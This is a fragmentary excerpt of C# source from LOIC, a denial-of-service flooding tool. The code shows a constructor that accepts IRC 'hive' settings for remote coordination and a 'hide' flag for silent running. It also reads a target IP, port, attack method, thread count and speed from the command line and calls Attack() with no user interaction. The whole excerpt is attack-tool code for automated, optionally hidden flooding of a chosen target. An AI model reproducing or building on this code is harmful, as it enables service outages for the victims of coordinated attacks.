...
namespace LOIC
{
	public partial class frmMain : Form
	{
		...
		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel, bool cmd, string ip, string port, string method, string threads, string sockets, string speed)
		{
			InitializeComponent();
			...
			if (cmd)
            {
				if (ip == "")
					return;
				LockOnIPCommandLine(hide, ip);
				chkMsgRandom.Checked = true;
				chkRandom.Checked = true;
				for (int i = 0; i < cbMethod.Items.Count; i++)
                {
					if (cbMethod.Items[i].ToString() != method)
						continue;
					cbMethod.SelectedIndex = i;
                }
				txtPort.Text = port;
				txtThreads.Text = threads;
				txtSLSpT.Text = sockets;
				tbSpeed.Value = int.Parse(speed);
				txtData.Text = "Even in death I serve the Omnissiah";
				Attack(true, false, hide);
            }
		}
		...
		private void LockOnIPCommandLine(bool silent = false, string ip = "")
		{
			try
			{
				string tIP = ip.Trim().ToLowerInvariant();
				if (tIP.Length == 0)
				{
					Wtf("I think you forgot the IP.", silent);
					return;
